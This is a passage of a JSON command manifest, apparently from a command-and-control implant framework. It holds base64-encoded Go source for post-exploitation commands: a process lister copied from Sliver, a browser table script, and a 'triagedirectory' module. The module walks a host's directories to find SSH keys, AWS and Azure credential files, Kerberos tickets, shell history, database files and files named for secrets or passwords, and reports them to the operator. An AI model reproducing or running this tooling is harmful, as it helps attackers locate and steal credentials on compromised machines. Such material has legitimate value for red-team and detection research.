ZSBwcyB7CgkJaWYgcC5QaWQoKSA9PSBwaWQgewoJCQlyZXR1cm4gcCwgbmlsCgkJfQoJfQoKCXJldHVybiBuaWwsIG5pbAp9CgpmdW5jIHByb2Nlc3NlcygpIChbXVByb2Nlc3MsIGVycm9yKSB7CglidWYsIGVyciA6PSBkYXJ3aW5TeXNjYWxsKCkKCWlmIGVyciAhPSBuaWwgewoJCXJldHVybiBuaWwsIGVycgoJfQoKCXByb2NzIDo9IG1ha2UoW10qa2luZm9Qcm9jLCAwLCA1MCkKCWsgOj0gMAoJZm9yIGkgOj0gX0tJTkZPX1NUUlVDVF9TSVpFOyBpIDwgYnVmLkxlbigpOyBpICs9IF9LSU5GT19TVFJVQ1RfU0laRSB7CgkJcHJvYyA6PSAma2luZm9Qcm9je30KCQllcnIgPSBiaW5hcnkuUmVhZChieXRlcy5OZXdCdWZmZXIoYnVmLkJ5dGVzKClbazppXSksIGJpbmFyeS5MaXR0bGVFbmRpYW4sIHByb2MpCgkJaWYgZXJyICE9IG5pbCB7CgkJCXJldHVybiBuaWwsIGVycgoJCX0KCgkJayA9IGkKCQlwcm9jcyA9IGFwcGVuZChwcm9jcywgcHJvYykKCX0KCglkYXJ3aW5Qcm9jcyA6PSBtYWtlKFtdUHJvY2VzcywgbGVuKHByb2NzKSkKCWZvciBpLCBwIDo9IHJhbmdlIHByb2NzIHsKCQlkYXJ3aW5Qcm9jc1tpXSA9ICZEYXJ3aW5Qcm9jZXNzewoJCQlwaWQ6ICAgIGludChwLlBpZCksCgkJCXBwaWQ6ICAgaW50KHAuUFBpZCksCgkJCWJpbmFyeTogZGFyd2luQ3N0cmluZyhwLkNvbW0pLAoJCQlvd25lcjogICIiLAoJCX0KCX0KCglyZXR1cm4gZGFyd2luUHJvY3MsIG5pbAp9CgpmdW5jIGRhcndpbkNzdHJpbmcocyBbMTZdYnl0ZSkgc3RyaW5nIHsKCWkgOj0gMAoJZm9yIF8sIGIgOj0gcmFuZ2UgcyB7CgkJaWYgYiAhPSAwIHsKCQkJaSsrCgkJfSBlbHNlIHsKCQkJYnJlYWsKCQl9Cgl9CgoJcmV0dXJuIHN0cmluZyhzWzppXSkKfQoKZnVuYyBkYXJ3aW5TeXNjYWxsKCkgKCpieXRlcy5CdWZmZXIsIGVycm9yKSB7CgltaWIgOj0gWzRdaW50MzJ7X0NUUkxfS0VSTiwgX0tFUk5fUFJPQywgX0tFUk5fUFJPQ19BTEwsIDB9CglzaXplIDo9IHVpbnRwdHIoMCkKCglfLCBfLCBlcnJubyA6PSBzeXNjYWxsLlN5c2NhbGw2KAoJCXN5c2NhbGwuU1lTX19fU1lTQ1RMLAoJCXVpbnRwdHIodW5zYWZlLlBvaW50ZXIoJm1pYlswXSkpLAoJCTQsCgkJMCwKCQl1aW50cHRyKHVuc2FmZS5Qb2ludGVyKCZzaXplKSksCgkJMCwKCQkwKQoKCWlmIGVycm5vICE9IDAgewoJCXJldHVybiBuaWwsIGVycm5vCgl9CgoJYnMgOj0gbWFrZShbXWJ5dGUsIHNpemUpCglfLCBfLCBlcnJubyA9IHN5c2NhbGwuU3lzY2FsbDYoCgkJc3lzY2FsbC5TWVNfX19TWVNDVEwsCgkJdWludHB0cih1bnNhZmUuUG9pbnRlcigmbWliWzBdKSksCgkJNCwKCQl1aW50cHRyKHVuc2FmZS5Qb2ludGVyKCZic1swXSkpLAoJCXVpbnRwdHIodW5zYWZlLlBvaW50ZXIoJnNpemUpKSwKCQkwLAoJCTApCgoJaWYgZXJybm8gIT0gMCB7CgkJcmV0dXJuIG5pbCwgZXJybm8KCX0KCglyZXR1cm4gYnl0ZXMuTmV3QnVmZmVyKGJzWzA6c2l6ZV0pLCBuaWwKfQoKY29uc3QgKAoJX0NUUkxfS0VSTiAgICAgICAgID0gMQoJX0tFUk5fUFJPQyAgICAgICAgID0gMTQKCV9LRVJOX1BST0NfQUxMICAgICA9IDAKCV9LSU5GT19TVFJVQ1RfU0laRSA9IDY0OAopCgp0eXBlIGtpbmZvUHJvYyBzdHJ1Y3QgewoJXyAgICBbNDBdYnl0ZQoJUGlkICBpbnQzMgoJXyAgICBbMTk5XWJ5dGUKCUNvbW0gWzE2XWJ5dGUKCV8gICAgWzMwMV1ieXRlCglQUGlkIGludDMyCglfICAgIFs4NF1ieXRlCn0K"
            },
            {
              "ps.go": "cGFja2FnZSBwcwoKaW1wb3J0ICgKCSJlbmNvZGluZy9qc29uIgoKCSJwa2cvdXRpbHMvc3RydWN0cyIKCSJzeW5jIgoJInBrZy9wcm9maWxlcyIKKQoKdmFyIG11IHN5bmMuTXV0ZXgKCi8vIFRha2VuIGRpcmVjdGx5IGZyb20gU2xpdmVyJ3MgUFMgY29tbWFuZC4gTGljZW5zZSBmaWxlIGluY2x1ZGVkIGluIHRoZSBmb2xkZXIKCi8vUHJvY2VzcyAtIHBsYXRmb3JtIGFnbm9zdGljIFByb2Nlc3MgaW50ZXJmYWNlCnR5cGUgUHJvY2VzcyBpbnRlcmZhY2UgewoJLy8gUGlkIGlzIHRoZSBwcm9jZXNzIElEIGZvciB0aGlzIHByb2Nlc3MuCglQaWQoKSBpbnQKCgkvLyBQUGlkIGlzIHRoZSBwYXJlbnQgcHJvY2VzcyBJRCBmb3IgdGhpcyBwcm9jZXNzLgoJUFBpZCgpIGludAoKCS8vIEFyY2ggaXMgdGhlIHg2NCBvciB4ODYKCUFyY2goKSBzdHJpbmcKCgkvLyBFeGVjdXRhYmxlIG5hbWUgcnVubmluZyB0aGlzIHByb2Nlc3MuIFRoaXMgaXMgbm90IGEgcGF0aCB0byB0aGUKCS8vIGV4ZWN1dGFibGUuCglFeGVjdXRhYmxlKCkgc3RyaW5nCgoJLy8gT3duZXIgaXMgdGhlIGFjY291bnQgbmFtZSBvZiB0aGUgcHJvY2VzcyBvd25lci4KCU93bmVyKCkgc3RyaW5nCgoJLy8gYmluX3BhdGggb2YgdGhlIHJ1bm5pbmcgcHJvY2VzcwoJQmluUGF0aCgpIHN0cmluZwp9CgovL1Byb2Nlc3NBcnJheSAtIHN0cnVjdCB0aGF0IHdpbGwgaG9sZCBhbGwgb2YgdGhlIFByb2Nlc3MgcmVzdWx0cwp0eXBlIFByb2Nlc3NBcnJheSBzdHJ1Y3QgewoJUmVzdWx0cyBbXVByb2Nlc3NEZXRhaWxzIGBqc29uOiJQcm9jZXNzZXMiYAp9Cgp0eXBlIFByb2Nlc3NEZXRhaWxzIHN0cnVjdCB7CglQcm9jZXNzSUQgICAgICAgaW50ICAgIGBqc29uOiJwcm9jZXNzX2lkImAKCVBhcmVudFByb2Nlc3NJRCBpbnQgICAgYGpzb246InBhcmVudF9wcm9jZXNzX2lkImAKCUFyY2ggICAgICAgICAgICBzdHJpbmcgYGpzb246ImFyY2hpdGVjdHVyZSJgCglQYXRoICAgICAgICAgICAgc3RyaW5nIGBqc29uOiJuYW1lImAKCVVzZXIgICAgICAgICAgICBzdHJpbmcgYGpzb246InVzZXIiYAoJQmluUGF0aAkJc3RyaW5nIGBqc29uOiJiaW5fcGF0aCJgCn0KCi8vUnVuIC0gaW50ZXJmYWNlIG1ldGhvZCB0aGF0IHJldHJpZXZlcyBhIHByb2Nlc3MgbGlzdApmdW5jIFJ1bih0YXNrIHN0cnVjdHMuVGFzaykgewoJcHJvY3MsIGVyciA6PSBwcm9jZXNzZXMoKQoJbXNnIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJbXNnLlRhc2tJRCA9IHRhc2suVGFza0lECglpZiBlcnIgIT0gbmlsIHsKCQltc2cuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQltc2cuU3RhdHVzID0gImVycm9yIgoKCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CgoJcCA6PSBtYWtlKFtdUHJvY2Vzc0RldGFpbHMsIGxlbihwcm9jcykpCgoJLy8gTG9vcCBvdmVyIHRoZSBwcm9jZXNzIHJlc3VsdHMgYW5kIGFkZCB0aGVtIHRvIHRoZSBqc29uIG9iamVjdCBhcnJheQoJZm9yIGluZGV4IDo9IDA7IGluZGV4IDwgbGVuKHByb2NzKTsgaW5kZXgrKyB7CgkJcFtpbmRleF0uQXJjaCA9IHByb2NzW2luZGV4XS5BcmNoKCkKCQlwW2luZGV4XS5Qcm9jZXNzSUQgPSBwcm9jc1tpbmRleF0uUGlkKCkKCQlwW2luZGV4XS5QYXJlbnRQcm9jZXNzSUQgPSBwcm9jc1tpbmRleF0uUFBpZCgpCgkJcFtpbmRleF0uVXNlciA9IHByb2NzW2luZGV4XS5Pd25lcigpCgkJcFtpbmRleF0uUGF0aCA9IHByb2NzW2luZGV4XS5FeGVjdXRhYmxlKCkKCQlwW2luZGV4XS5CaW5QYXRoID0gcHJvY3NbaW5kZXhdLkJpblBhdGgoKQoJfQoKCXZhciBwYSBQcm9jZXNzQXJyYXkKCXBhLlJlc3VsdHMgPSBwCglqc29uUHJvY3MsIGVyIDo9IGpzb24uTWFyc2hhbEluZGVudChwLCAiIiwgIgkiKQoKCWlmIGVyICE9IG5pbCB7CgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQogICAgbXNnLkNvbXBsZXRlZCA9IHRydWUKCW1zZy5Vc2VyT3V0cHV0ID0gc3RyaW5nKGpzb25Qcm9jcykKCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCW11LkxvY2soKQoJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJbXUuVW5sb2NrKCkKCXJldHVybgp9Cg=="
            }
          ],
          "transforms": [],
          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2UpewogIHZhciByb3dzID0gW107CiAgZm9yKHZhciBpID0gMDsgaSA8IHJlc3BvbnNlLmxlbmd0aDsgaSsrKXsKICAgIHRyeXsKICAgICAgICB2YXIgZGF0YSA9IEpTT04ucGFyc2UocmVzcG9uc2VbaV1bJ3Jlc3BvbnNlJ10pOwogICAgfWNhdGNoKGVycm9yKXsKICAgICAgICByZXR1cm4gcmVzcG9uc2U7CiAgICB9CiAgIHZhciByb3dfc3R5bGUgPSAiIjsKICAgdmFyIGNlbGxfc3R5bGUgPSB7ImhpZGRlbiI6ICJ0ZXh0LWFsaWduOmNlbnRlciIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidHlwZSI6InRleHQtYWxpZ246Y2VudGVyIn07CiAgICAKICAgIGRhdGEuZm9yRWFjaChmdW5jdGlvbihyKXsKICAgICAgdmFyIHJvd19zdHlsZSA9ICIiOwogICAgICByb3dzLnB1c2goeyJwcm9jZXNzX2lkIjogclsncHJvY2Vzc19pZCddLAogICAgICAgICAgICAgICAgICAgICAgICAgICJwYXJlbnRfcHJvY2Vzc19pZCI6IHJbJ3BhcmVudF9wcm9jZXNzX2lkJ10sCiAgICAgICAgICAgICAgICAgICAgICAgICAgInBhdGgiOiByWydiaW5fcGF0aCddLAogICAgICAgICAgICAgICAgICAgICAgICAgICJ1c2VyIjogclsndXNlciddLAogICAgICAgICAgICAgICAgICAgICAgICAgICJyb3ctc3R5bGUiOiByb3dfc3R5bGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICJjZWxsLXN0eWxlIjoge30KICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgfSk7CiAgfQogIHZhciBvdXRwdXQgPSBzdXBwb3J0X3NjcmlwdHNbJ2NyZWF0ZV90YWJsZSddKFt7Im5hbWUiOiJwcm9jZXNzX2lkIiwgInNpemUiOiIxMGVtIn0seyJuYW1lIjoicGFyZW50X3Byb2Nlc3NfaWQiLCAic2l6ZSI6IjEwZW0ifSwgeyJuYW1lIjogInVzZXIiLCAic2l6ZSI6ICIxMGVtIn0seyJuYW1lIjoicGF0aCIsICJzaXplIjoiIn1dLCByb3dzKTsKICByZXR1cm4gb3V0cHV0Owp9"
        },
        {
          "needs_admin": false,
          "help_cmd": "triagedirectory [\/home\/username\/]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Find interesting files within a directory on a host.",
          "cmd": "triagedirectory",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1083",
              "attack_name": "File and Directory Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "triagedirectory.go": "cGFja2FnZSB0cmlhZ2VkaXJlY3RvcnkKCmltcG9ydCAoCgkiZW5jb2RpbmcvanNvbiIKCSJpby9pb3V0aWwiCgkib3MiCgkicGF0aC9maWxlcGF0aCIKCSJzdHJpbmdzIgoJInN5bmMiCgkicGtnL3Byb2ZpbGVzIgoJInBrZy91dGlscy9zdHJ1Y3RzIgopCgp2YXIgbXUgc3luYy5NdXRleAoKdHlwZSBPU0ZpbGUgc3RydWN0IHsKCVBhdGggICAgICAgICAgICAgc3RyaW5nIGBqc29uOiJwYXRoImAKCU5hbWUgICAgICAgICAgICAgc3RyaW5nIGBqc29uOiJuYW1lImAKCVNpemUgICAgICAgICAgICAgaW50NjQgIGBqc29uOiJzaXplImAKCU1vZGUgICAgICAgICAgICAgc3RyaW5nIGBqc29uOiJtb2RlImAKCU1vZGlmaWNhdGlvblRpbWUgc3RyaW5nIGBqc29uOiJtb2RpZmljYXRpb25fdGltZSJgCglJc0RpciAgICAgICAgICAgIGJvb2wgICBganNvbjoiaXNfZGlyImAKfQoKdHlwZSBEaXJlY3RvcnlUcmlhZ2VSZXN1bHQgc3RydWN0IHsKCW11dGV4ICAgICAgICAgICAgIHN5bmMuTXV0ZXgKCUF6dXJlRmlsZXMgICAgICAgIFtdT1NGaWxlIGBqc29uOiJhenVyZV9maWxlcyJgCglBV1NGaWxlcyAgICAgICAgICBbXU9TRmlsZSBganNvbjoiYXdzX2ZpbGVzImAKCVNTSEZpbGVzICAgICAgICAgIFtdT1NGaWxlIGBqc29uOiJzc2hfZmlsZXMiYAoJTVNXb3JkRmlsZXMgICAgICAgW11PU0ZpbGUgYGpzb246Im1zd29yZF9maWxlcyJgCglNU0V4Y2VsRmlsZXMgICAgICBbXU9TRmlsZSBganNvbjoibXNleGNlbF9maWxlcyJgCglNU1Bvd2VyUG9pbnRGaWxlcyBbXU9TRmlsZSBganNvbjoibXNwcHR4X2ZpbGVzImAKCUhpc3RvcnlGaWxlcyAgICAgIFtdT1NGaWxlIGBqc29uOiJoaXN0b3J5X2ZpbGVzImAKCVBERnMgICAgICAgICAgICAgIFtdT1NGaWxlIGBqc29uOiJwZGZzImAKCUxvZ0ZpbGVzICAgICAgICAgIFtdT1NGaWxlIGBqc29uOiJsb2dfZmlsZXMiYAoJU2hlbGxTY3JpcHRGaWxlcyAgW11PU0ZpbGUgYGpzb246InNoZWxsc2NyaXB0X2ZpbGVzImAKCVlBTUxGaWxlcyAgICAgICAgIFtdT1NGaWxlIGBqc29uOiJ5YW1sX2ZpbGVzImAKCUNvbmZGaWxlcyAgICAgICAgIFtdT1NGaWxlIGBqc29uOiJjb25mX2ZpbGVzImAKCUNTVkZpbGVzICAgICAgICAgIFtdT1NGaWxlIGBqc29uOiJjc3ZfZmlsZXMiYAoJRGF0YWJhc2VGaWxlcyAgICAgW11PU0ZpbGUgYGpzb246ImRiX2ZpbGVzImAKCU15U3FsQ29uZkZpbGVzICAgIFtdT1NGaWxlIGBqc29uOiJteXNxbF9jb25mcyJgCglLZXJiZXJvc0ZpbGVzICAgICBbXU9TRmlsZSBganNvbjoia2VyYmVyb3NfdGlja2V0cyJgCglUZXh0RmlsZXMgICAgICAgICBbXU9TRmlsZSBganNvbjoidGV4dF9maWxlcyJgCglJbnRlcmVzdGluZ0ZpbGVzICBbXU9TRmlsZSBganNvbjoiaW50ZXJlc3RpbmdfZmlsZXMiYAp9CgpmdW5jIE5ld0RpcmVjdG9yeVRyaWFnZVJlc3VsdCgpICpEaXJlY3RvcnlUcmlhZ2VSZXN1bHQgewoJbXR4IDo9IHN5bmMuTXV0ZXh7fQoJcmV0dXJuICZEaXJlY3RvcnlUcmlhZ2VSZXN1bHR7CgkJbXV0ZXg6IG10eCwKCX0KfQoKZnVuYyBSdW4odGFzayBzdHJ1Y3RzLlRhc2spIHsKCW1zZyA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCW1zZy5UYXNrSUQgPSB0YXNrLlRhc2tJRAoKCS8vIGxvZy5QcmludGxuKCJQYXJzZWQgdGFzayBwYXJhbXMhIikKCWlmIGxlbih0YXNrLlBhcmFtcykgPT0gMCB7CgkJbXNnLlVzZXJPdXRwdXQgPSAiRXJyb3I6IE5vIHBhdGggZ2l2ZW4uIgoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CglyZXN1bHQgOj0gTmV3RGlyZWN0b3J5VHJpYWdlUmVzdWx0KCkKCWdvIHRhc2suSm9iLk1vbml0b3JTdG9wKCkKCWVyciA6PSB0cmlhZ2VEaXJlY3RvcnkodGFzay5QYXJhbXMsIHJlc3VsdCwgdGFzay5Kb2IpCgkvLyBJZiBpdCBkaWRuJ3QgZW5kIHByZW1hdHVyZWx5LCBzZW5kIHRoZSBraWxsLgoJaWYgdGFzay5Kb2IuTW9uaXRvcmluZyB7CgkJZ28gdGFzay5Kb2IuU2VuZEtpbGwoKQoJfQoJLy8gZm10LlByaW50bG4ocmVzdWx0KQoJaWYgZXJyICE9IG5pbCB7CgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfSBlbHNlIHsKCQlpZiAhaXNEaXJlY3RvcnlUcmlhZ2VSZXN1bHRFbXB0eSgqcmVzdWx0KSB7CgkJCWRhdGEsIGVyciA6PSBqc29uLk1hcnNoYWxJbmRlbnQocmVzdWx0LCAiIiwgIiAgICAiKQoJCQkvLyAvLyBmbXQuUHJpbnRsbigiRGF0YToiLCBzdHJpbmcoZGF0YSkpCgkJCWlmIGVyciAhPSBuaWwgewoJCQkJLy8gZm10LlByaW50bG4oIkVycm9yIHdhcyBub3QgbmlsIHdoZW4gbWFyc2hhbGxpbmchIiwgZXJyLkVycm9yKCkpCgkJCQltc2cuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkJCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoJCQkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJCQltdS5Mb2NrKCkKCQkJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQkJCW11LlVubG9jaygpCgkJCQlyZXR1cm4KCQkJfSBlbHNlIHsKCQkJCW1zZy5Vc2VyT3V0cHV0ID0gc3RyaW5nKGRhdGEpCgkJCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoJCQkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCQkJbXUuTG9jaygpCgkJCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgkJCQltdS5VbmxvY2soKQoJCQkJcmV0dXJuCgkJCX0KCQl9IGVsc2UgewoJCQltc2cuVXNlck91dHB1dCA9ICJUYXNrIGNvbXBsZXRlZCBhbmQgbm90aGluZyBub3Rld29ydGh5IGZvdW5kLiIKCQkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCQltdS5Mb2NrKCkKCQkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCQltdS5VbmxvY2soKQoJCQlyZXR1cm4KCQl9Cgl9CglyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgltdS5Mb2NrKCkKCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCW11LlVubG9jaygpCglyZXR1cm4KfQoKZnVuYyBpc0RpcmVjdG9yeVRyaWFnZVJlc3VsdEVtcHR5KHJlc3VsdCBEaXJlY3RvcnlUcmlhZ2VSZXN1bHQpIGJvb2wgewoJcmV0dXJuIGxlbihyZXN1bHQuQVdTRmlsZXMpID09IDAgJiYgbGVuKHJlc3VsdC5TU0hGaWxlcykgPT0gMCAmJiBsZW4ocmVzdWx0LkF6dXJlRmlsZXMpID09IDAgJiYgbGVuKHJlc3VsdC5IaXN0b3J5RmlsZXMpID09IDAgJiYgbGVuKHJlc3VsdC5Mb2dGaWxlcykgPT0gMCAmJiBsZW4ocmVzdWx0LlNoZWxsU2NyaXB0RmlsZXMpID09IDAgJiYgbGVuKHJlc3VsdC5ZQU1MRmlsZXMpID09IDAgJiYgbGVuKHJlc3VsdC5Db25mRmlsZXMpID09IDAgJiYgbGVuKHJlc3VsdC5DU1ZGaWxlcykgPT0gMCAmJiBsZW4ocmVzdWx0LkRhdGFiYXNlRmlsZXMpID09IDAgJiYgbGVuKHJlc3VsdC5NeVNxbENvbmZGaWxlcykgPT0gMCAmJiBsZW4ocmVzdWx0LktlcmJlcm9zRmlsZXMpID09IDAgJiYgbGVuKHJlc3VsdC5JbnRlcmVzdGluZ0ZpbGVzKSA9PSAwCn0KCmZ1bmMgbmV3T1NGaWxlKHBhdGggc3RyaW5nLCBpbmZvIG9zLkZpbGVJbmZvKSBPU0ZpbGUgewoJcmV0dXJuIE9TRmlsZXsKCQlQYXRoOiAgICAgICAgICAgICBwYXRoLAoJCU5hbWU6ICAgICAgICAgICAgIGluZm8uTmFtZSgpLAoJCVNpemU6ICAgICAgICAgICAgIGluZm8uU2l6ZSgpLAoJCU1vZGU6ICAgICAgICAgICAgIGluZm8uTW9kZSgpLlBlcm0oKS5TdHJpbmcoKSwKCQlNb2RpZmljYXRpb25UaW1lOiBpbmZvLk1vZFRpbWUoKS5TdHJpbmcoKSwKCQlJc0RpcjogICAgICAgICAgICBpbmZvLklzRGlyKCksCgl9Cn0KCi8vIEhlbHBlciBmdW5jdGlvbiB0byBhZGQgYW4gT1MgZmlsZSB0byBhIHNsaWNlIG9mIE9TIEZpbGVzLgpmdW5jIGFkZEZpbGVUb1NsaWNlKHNsaWNlICpbXU9TRmlsZSwgcGF0aCBzdHJpbmcsIGluZm8gb3MuRmlsZUluZm8pIHsKCSpzbGljZSA9IGFwcGVuZCgqc2xpY2UsIG5ld09TRmlsZShwYXRoLCBpbmZvKSkKfQoKZnVuYyBhbnlTbGljZUluU3RyaW5nKHMgc3RyaW5nLCBzbGljZSBbXXN0cmluZykgYm9vbCB7Cglmb3IgXywgeCA6PSByYW5nZSBzbGljZSB7CgkJaWYgc3RyaW5ncy5Db250YWlucyhzLCB4KSB7CgkJCXJldHVybiB0cnVlCgkJfQoJfQoJcmV0dXJuIGZhbHNlCn0KCmZ1bmMgYWRkRmlsZVRvRGlyZWN0b3J5VHJpYWdlUmVzdWx0KGZpbGVwYXRoIHN0cmluZywgaW5mbyBvcy5GaWxlSW5mbywgcmVzdWx0ICpEaXJlY3RvcnlUcmlhZ2VSZXN1bHQsIHNsaWNlICpbXU9TRmlsZSkgewoJcmVzdWx0Lm11dGV4LkxvY2soKQoJYWRkRmlsZVRvU2xpY2Uoc2xpY2UsIGZpbGVwYXRoLCBpbmZvKQoJcmVzdWx0Lm11dGV4LlVubG9jaygpCn0KCnZhciBpbnRlcmVzdGluZ05hbWVzID0gW11zdHJpbmd7InNlY3JldCIsICJwYXNzd29yZCIsICJjcmVkZW50aWFsIn0KCi8vIFRyaWFnZSBhIHNwZWNpZmllZCBob21lLXBhdGggZm9yIGludGVyZXN0aW5nIGZpbGVzLCBpbmNsdWRpbmc6Ci8vIFNlZTogRGlyZWN0b3J5VHJpYWdlUmVzdWx0CmZ1bmMgdHJpYWdlRGlyZWN0b3J5KHRyaWFnZVBhdGggc3RyaW5nLCByZXN1bHQgKkRpcmVjdG9yeVRyaWFnZVJlc3VsdCwgam9iICpzdHJ1Y3RzLkpvYikgZXJyb3IgewoJaWYgXywgZXJyIDo9IG9zLlN0YXQodHJpYWdlUGF0aCk7IG9zLklzTm90RXhpc3QoZXJyKSB7CgkJcmV0dXJuIGVycgoJfQoKCWZpbGVzLCBlcnIgOj0gaW91dGlsLlJlYWREaXIodHJpYWdlUGF0aCkKCWlmIGVyciAhPSBuaWwgewoJCXJldHVybiBlcnIKCX0KCXdnIDo9IHN5bmMuV2FpdEdyb3Vwe30KCWZvciBfLCBmaWxlIDo9IHJhbmdlIGZpbGVzIHsKCQlpZiAqam9iLlN0b3AgPiAwIHsKCQkJYnJlYWsKCQl9CgkJZnVsbHBhdGggOj0gZmlsZXBhdGguSm9pbih0cmlhZ2VQYXRoLCBmaWxlLk5hbWUoKSkKCQlpZiBmaWxlLklzRGlyKCkgewoJCQlpZiBhbnlTbGljZUluU3RyaW5nKGZpbGUuTmFtZSgpLCBpbnRlcmVzdGluZ05hbWVzKSB7CgkJCQlhZGRGaWxlVG9EaXJlY3RvcnlUcmlhZ2VSZXN1bHQoZnVsbHBhdGgsIGZpbGUsIHJlc3VsdCwgJnJlc3VsdC5JbnRlcmVzdGluZ0ZpbGVzKQoJCQl9IGVsc2UgaWYgZmlsZS5OYW1lKCkgPT0gIi5naXQiIHsKCQkJCWFkZEZpbGVUb0RpcmVjdG9yeVRyaWFnZVJlc3VsdChmdWxscGF0aCwgZmlsZSwgcmVzdWx0LCAmcmVzdWx0LkludGVyZXN0aW5nRmlsZXMpCgkJCX0KCQkJd2cuQWRkKDEpCgkJCWdvIGZ1bmMocGF0aCBzdHJpbmcsIGRpcnRyaWFnZSAqRGlyZWN0b3J5VHJpYWdlUmVzdWx0LCBqb2IgKnN0cnVjdHMuSm9iKSB7CgkJCQlkZWZlciB3Zy5Eb25lKCkKCQkJCXRyaWFnZURpcmVjdG9yeShwYXRoLCBkaXJ0cmlhZ2UsIGpvYikKCQkJfShmdWxscGF0aCwgcmVzdWx0LCBqb2IpCgkJfSBlbHNlIHsKCQkJaWYgc3RyaW5ncy5Db250YWlucyhmdWxscGF0aCwgc3RyaW5nKG9zLlBhdGhTZXBhcmF0b3IpKyIuc3NoIitzdHJpbmcob3MuUGF0aFNlcGFyYXRvcikpIHsKCQkJCXN3aXRjaCBmaWxlLk5hbWUoKSB7CgkJCQljYXNlICJhdXRob3JpemVkX2tleXMiOgoJCQkJCWJyZWFrCgkJCQljYXNlICJrbm93bl9ob3N0cyI6CgkJCQkJYnJlYWsKCQkJCWRlZmF1bHQ6CgkJCQkJYWRkRmlsZVRvRGlyZWN0b3J5VHJpYWdlUmVzdWx0KGZ1bGxwYXRoLCBmaWxlLCByZXN1bHQsICZyZXN1bHQuU1NIRmlsZXMpCgkJCQkJLy8gYWRkRmlsZVRvU2xpY2UoJnJlc3VsdC5TU0hGaWxlcywgZnVsbHBhdGgsIGZpbGUpCgkJCQkJYnJlYWsKCQkJCX0KCQkJCS8vIEFkZCBhbnkgZmlsZSB3aXRoaW4gdGhlIEFXUyBkaXJlY3RvcnkuCgkJCX0gZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKGZ1bGxwYXRoLCBzdHJpbmcob3MuUGF0aFNlcGFyYXRvcikrIi5hd3MiK3N0cmluZyhvcy5QYXRoU2VwYXJhdG9yKSkgewoJCQkJYWRkRmlsZVRvRGlyZWN0b3J5VHJpYWdlUmVzdWx0KGZ1bGxwYXRoLCBmaWxlLCByZXN1bHQsICZyZXN1bHQuQVdTRmlsZXMpCgkJCQkvLyBhZGRGaWxlVG9TbGljZSgmcmVzdWx0LkFXU0ZpbGVzLCBmdWxscGF0aCwgZmlsZSkKCQkJCS8vIEFkZCBhbGwgaGlzdG9yeSBmaWxlcy4KCQkJfSBlbHNlIGlmIH